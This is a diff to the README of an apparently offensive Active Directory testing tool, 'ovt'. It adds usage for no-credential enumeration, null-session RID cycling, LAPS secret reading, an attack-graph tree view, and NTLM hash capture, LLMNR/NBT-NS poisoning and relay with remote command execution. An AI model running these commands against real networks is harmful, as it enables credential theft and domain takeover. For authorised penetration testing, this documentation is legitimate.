@@ -208,6 +208,13 @@ ovt reaper --dc-ip 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!' --page-si
 Enumerate specific AD object types without running the full reaper engine.
 
 ```bash
+# Pre-auth and no-credential checks
+ovt enum pre -H 10.10.10.1
+ovt enum anonymous -H 10.10.10.1
+ovt enum null-session -H 10.10.10.1
+ovt rid -H 10.10.10.1 --start-rid 500 --end-rid 1100 --null-session
+
+# Credentialed LDAP modules
 ovt enum users -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
 ovt enum computers -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
 ovt enum groups -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
@@ -227,6 +234,9 @@ ovt enum users -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!' --include-
 
 | Target | What it finds |
 |---|---|
+| `pre` | No-credential AD service triage on common Kerberos, LDAP, SMB, RPC, GC, RDP, WinRM, and ADWS ports, then anonymous LDAP RootDSE if LDAP is open. |
+| `anonymous` | Anonymous LDAP bind and RootDSE attributes when the DC permits it. |
+| `null-session` | Null-session RID cycling through the existing Rust MS-SAMR path, default RID range 500-1100. |
 | `users` | All domain users. The guest list. |
 | `computers` | All machine accounts. The hardware census. |
 | `groups` | Groups & memberships. The org chart of doom. |
@@ -235,6 +245,8 @@ ovt enum users -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!' --include-
 | `asrep` | AS-REP roastable accounts. Someone unchecked a box. |
 | `delegations` | Constrained, unconstrained, RBCD. Delegation = impersonation. |
 | `gpos` | Group Policy Objects. Where the misconfigurations live. |
+| `laps` | LAPS-readable secrets through the credentialed LDAP module. |
+| `policy` | Password and domain policy through the credentialed LDAP module. |
 | `all` | Everything above. YOLO. |
 
 ---
@@ -335,6 +347,10 @@ ovt graph build -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
 ovt graph view --file attack_graph.json
 ovt graph view -i ./bloodhound-json/
 
+# Launch interactive BloodHound-style hierarchy/tree explorer
+ovt graph tree --file attack_graph.json
+ovt graph tree -i ./bloodhound-json/
+
 # Find shortest path between two nodes
 ovt graph path --from jsmith --to "Domain Admins"
 
@@ -353,6 +369,8 @@ ovt graph stats
 ovt graph export --output graph.json
 ovt graph export --output bloodhound.json --bloodhound
 ```
+
+`ovt graph view` renders the graph canvas without node or filter labels inside the graph area at any zoom level; labels stay in the node, edge, header, and detail panels. `ovt graph tree` renders a fully interactive domain -> object type -> object -> inbound/outbound relationship tree with rich human-readable detail panes.
 
 ---
 
@@ -489,9 +507,11 @@ Aliases: `ovt relay`
 ```bash
 # Capture NTLM hashes (Responder-style)
 ovt ntlm capture --interface eth0 --port 445
+ovt ntlm capture --interface eth0 --port 445 --no-poison
 
 # Relay to SMB targets
 ovt ntlm relay --targets 10.10.10.50:445,10.10.10.51:445
+ovt ntlm relay --targets 10.10.10.50:445 --no-poison
 
 # SMB-specific relay
 ovt ntlm smb-relay --targets 10.10.10.50:445 --command "whoami"
@@ -499,6 +519,8 @@ ovt ntlm smb-relay --targets 10.10.10.50:445 --command "whoami"
 # HTTP relay (for ADCS ESC8)
 ovt ntlm http-relay --targets 10.10.10.1:80 --command "whoami"
 ```
+
+`capture` and `relay` use the Rust relay controller with LLMNR and NBT-NS enabled by default. Use `--no-poison` when you only want relay/listener behavior from already-captured or externally-coerced authentication.
 
 ---
 
